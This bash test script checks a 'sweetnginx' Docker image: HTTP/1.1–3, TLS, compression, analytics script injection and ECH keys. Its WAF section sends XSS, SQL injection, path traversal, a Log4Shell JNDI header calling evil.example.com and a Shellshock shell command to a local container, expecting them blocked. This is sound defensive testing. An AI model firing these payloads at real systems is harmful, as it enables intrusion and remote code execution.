#!/usr/bin/env bash
set -uo pipefail

IMAGE="${1:-sweetnginx:test}"
CONTAINER="sweetnginx-test-$$"
CERT_DIR=$(mktemp -d)
ECH_DIR=$(mktemp -d)
PASS=0
FAIL=0

RED='\033[0;31m'; GREEN='\033[0;32m'; BOLD='\033[1m'; NC='\033[0m'

HTTP_PORT=18080
HTTPS_PORT=18443

cleanup() {
  docker rm -f "$CONTAINER" 2>/dev/null || true
  rm -rf "$CERT_DIR"
  rm -rf "$ECH_DIR"
}
trap cleanup EXIT

# ---- helpers ----------------------------------------------------------------

# curl against the nginx container via mapped ports
curl_() { curl -sk --max-time 10 "$@"; }

http()  { curl_ "http://localhost:${HTTP_PORT}$1"; }
https() { curl_ "https://localhost:${HTTPS_PORT}$1"; }

status_http()  { curl_ -o /dev/null -w '%{http_code}' "http://localhost:${HTTP_PORT}$1"; }
status_https() { curl_ -o /dev/null -w '%{http_code}' "https://localhost:${HTTPS_PORT}$1"; }
version_()     { curl_ "$@" -o /dev/null -w '%{http_version}'; }

label() { printf "  %-50s" "$1"; }
pass()  { echo -e "${GREEN}PASS${NC}"; PASS=$((PASS+1)); }
fail()  { echo -e "${RED}FAIL${NC}  ← $1"; FAIL=$((FAIL+1)); }

check() {
  local name="$1"; shift
  label "$name"
  local out
  if out=$("$@" 2>&1); then pass; else fail "$out"; fi
}

# ---- setup ------------------------------------------------------------------

echo -e "\n${BOLD}sweetnginx integration test${NC}\n"

# Verify host curl supports HTTP/3
if ! curl --version 2>&1 | grep -q ngtcp2; then
  echo "ERROR: host curl does not have HTTP/3 support (ngtcp2 required)"
  exit 1
fi

echo "Generating ECH key..."
if docker run --rm -v "$ECH_DIR:/etc/nginx/ech" "$IMAGE" \
    gen-ech-keys localhost >/dev/null 2>&1; then
  ECH_KEY_READY=true
else
  ECH_KEY_READY=false
  echo "Warning: ECH key generation failed; ECH key tests will be skipped"
fi

echo "Generating TLS certificate..."
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout "$CERT_DIR/tls.key" \
  -out    "$CERT_DIR/tls.crt" \
  -days 1 -subj '/CN=localhost' \
  -addext 'subjectAltName=IP:127.0.0.1,DNS:localhost' 2>/dev/null

REPO="$(cd "$(dirname "$0")/.." && pwd)"

echo "Starting nginx..."
docker run -d --name "$CONTAINER" \
  -p "${HTTP_PORT}:80" \
  -p "${HTTPS_PORT}:443/tcp" \
  -p "${HTTPS_PORT}:443/udp" \
  -v "$REPO/conf/nginx.test.conf:/usr/local/openresty/nginx/conf/nginx.conf:ro" \
  -v "$CERT_DIR:/etc/nginx/tls:ro" \
  -v "$ECH_DIR:/etc/nginx/ech:ro" \
  "$IMAGE" >/dev/null

printf "Waiting for nginx to become ready"
for i in $(seq 1 30); do
  if curl_ -sf "http://localhost:${HTTP_PORT}/_gwhealthz" >/dev/null 2>&1; then
    echo -e " ${GREEN}ready${NC}\n"
    break
  fi
  if [ "$i" -eq 30 ]; then
    echo " timed out"
    docker logs "$CONTAINER"
    exit 1
  fi
  printf "."
  sleep 1
done

# ---- tests ------------------------------------------------------------------

echo -e "${BOLD}HTTP versions${NC}"

check "HTTP/1.1 request" \
  curl_ --http1.1 -sf "http://localhost:${HTTP_PORT}/_gwhealthz"

check "HTTP/2 request" \
  curl_ --http2 -sf "https://localhost:${HTTPS_PORT}/_gwhealthz"

check "HTTP/3 request" \
  curl_ --http3-only -sf "https://localhost:${HTTPS_PORT}/_gwhealthz"

label "HTTP/2 protocol negotiated"
v=$(version_ --http2 "https://localhost:${HTTPS_PORT}/")
if echo "$v" | grep -q "^2"; then pass; else fail "got: $v"; fi

label "HTTP/3 protocol negotiated"
v=$(version_ --http3-only "https://localhost:${HTTPS_PORT}/")
if echo "$v" | grep -q "^3"; then pass; else fail "got: $v"; fi

echo ""
echo -e "${BOLD}TLS${NC}"

label "TLS 1.2 accepted"
s=$(curl_ --tlsv1.2 --tls-max 1.2 -sk -o /dev/null -w '%{http_code}' "https://localhost:${HTTPS_PORT}/")
if [ "$s" = "200" ]; then pass; else fail "status: $s"; fi

label "TLS 1.3 accepted"
s=$(curl_ --tlsv1.3 -sk -o /dev/null -w '%{http_code}' "https://localhost:${HTTPS_PORT}/")
if [ "$s" = "200" ]; then pass; else fail "status: $s"; fi

check "Alt-Svc header advertises HTTP/3" bash -c \
  "curl -skI --max-time 10 https://localhost:${HTTPS_PORT}/ | grep -qi 'alt-svc:.*h3'"

echo ""
echo -e "${BOLD}Response headers${NC}"

label "Server header suppressed"
if ! curl_ -sf -I "http://localhost:${HTTP_PORT}/" | grep -qi "^server:"; then
  pass
else
  fail "Server header present"
fi

echo ""
echo -e "${BOLD}Compression${NC}"

label "Gzip"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: gzip" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -qi "content-encoding: gzip"; then pass; else fail "no content-encoding: gzip"; fi

label "Brotli"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: br" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -qi "content-encoding: br"; then pass; else fail "no content-encoding: br"; fi

label "Zstd"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: zstd" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -qi "content-encoding: zstd"; then pass; else fail "no content-encoding: zstd"; fi

label "Gzip over HTTPS"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: gzip" "https://localhost:${HTTPS_PORT}/test-gzip" \
    | grep -qi "content-encoding: gzip"; then pass; else fail "no content-encoding: gzip"; fi

label "Brotli over HTTPS"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: br" "https://localhost:${HTTPS_PORT}/test-gzip" \
    | grep -qi "content-encoding: br"; then pass; else fail "no content-encoding: br"; fi

label "Zstd over HTTPS"
if curl_ -sf -D - -o /dev/null -H "Accept-Encoding: zstd" "https://localhost:${HTTPS_PORT}/test-gzip" \
    | grep -qi "content-encoding: zstd"; then pass; else fail "no content-encoding: zstd"; fi

label "Prefers brotli over gzip when both offered"
enc=$(curl_ -sf -D - -o /dev/null -H "Accept-Encoding: gzip, br" "http://localhost:${HTTP_PORT}/test-gzip" \
    | grep -i "^content-encoding:" | tr -d '\r')
if echo "$enc" | grep -qi "br"; then pass; else fail "got: $enc"; fi

echo ""
echo -e "${BOLD}sub_filter${NC}"

label "Analytics script injected in HTML"
if curl_ -sf "https://localhost:${HTTPS_PORT}/test-html" | grep -q "trace.pmh.codes"; then
  pass
else
  fail "script tag not found in response"
fi

label "Script tag placed inside <head>"
if curl_ -sf "https://localhost:${HTTPS_PORT}/test-html" \
    | grep -q '<head><script src="https://trace.pmh.codes'; then
  pass
else
  fail "unexpected position in response"
fi

echo ""
echo -e "${BOLD}ModSecurity WAF${NC}"

label "Normal request allowed (200)"
s=$(status_http "/")
if [ "$s" = "200" ]; then pass; else fail "status: $s"; fi

label "XSS blocked (403)"
s=$(status_http "/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "SQL injection blocked (403)"
s=$(status_http "/?q=1%27%20OR%20%271%27%3D%271")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "Path traversal blocked (403)"
s=$(status_http "/?q=..%2F..%2F..%2Fetc%2Fpasswd")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "Log4Shell blocked (403)"
s=$(curl_ -o /dev/null -w '%{http_code}' \
  -H 'X-Api-Version: ${jndi:ldap://evil.example.com/a}' \
  "http://localhost:${HTTP_PORT}/")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

label "Shellshock blocked (403)"
s=$(curl_ -o /dev/null -w '%{http_code}' \
  -H 'User-Agent: () { :; }; /bin/sh -c id' \
  "http://localhost:${HTTP_PORT}/")
if [ "$s" = "403" ]; then pass; else fail "status: $s"; fi

# ---- ECH --------------------------------------------------------------------

echo ""
echo -e "${BOLD}ECH${NC}"

check "openssl-ech binary functional" \
  docker exec "$CONTAINER" openssl-ech version

if [ "${ECH_KEY_READY:-false}" = "true" ]; then
  check "ECH key file present" \
    docker exec "$CONTAINER" test -f /etc/nginx/ech/server.ech.pem

  # Validate the file is a proper PEM (non-empty, starts with a PEM header)
  check "ECH key is valid PEM" \
    docker exec "$CONTAINER" \
      sh -c 'head -1 /etc/nginx/ech/server.ech.pem | grep -q "^-----BEGIN"'

  # ssl_certificate_by_lua_block logs at WARN level (above the error_log
  # threshold) on successful key load.  Prior HTTPS tests already triggered
  # the first TLS connection, so the message must be present by now.
  label "ECH keys loaded into SSL_CTX (nginx log)"
  if docker logs "$CONTAINER" 2>&1 | grep -q "ECH keys loaded"; then
    pass
  else
    fail "no 'ECH keys loaded' in nginx log (raw_server_ssl_ctx may be unavailable)"
  fi

  label "No ECH failures in nginx log"
  if ! docker logs "$CONTAINER" 2>&1 | grep -qi "ECH.*fail\|echstore.*fail"; then
    pass
  else
    fail "ECH failure found in nginx log"
  fi

  # HTTPS must still work with ssl_certificate_by_lua_block active
  label "HTTPS works with ECH keys loaded"
  s=$(status_https "/")
  if [ "$s" = "200" ]; then pass; else fail "status: $s"; fi

  label "ECH GREASE accepted"
  ech_err=$(curl_ --ech grease --head "https://localhost:${HTTPS_PORT}/" 2>&1)
  ech_rc=$?
  if [ $ech_rc -eq 0 ]; then
    pass
  elif echo "$ech_err" | grep -qi "unknown option\|option --ech"; then
    printf "\033[0;33mSKIP\033[0m (curl lacks --ech)\n"
  else
    fail "$ech_err"
  fi
else
  label "ECH key tests (key generation failed — skipping)"
  printf "\033[0;33mSKIP\033[0m\n"
fi

# ---- summary ----------------------------------------------------------------

echo ""
echo "────────────────────────────────────────────"
echo -e "  ${GREEN}${PASS} passed${NC}   ${RED}${FAIL} failed${NC}"
echo "────────────────────────────────────────────"

exit $FAIL
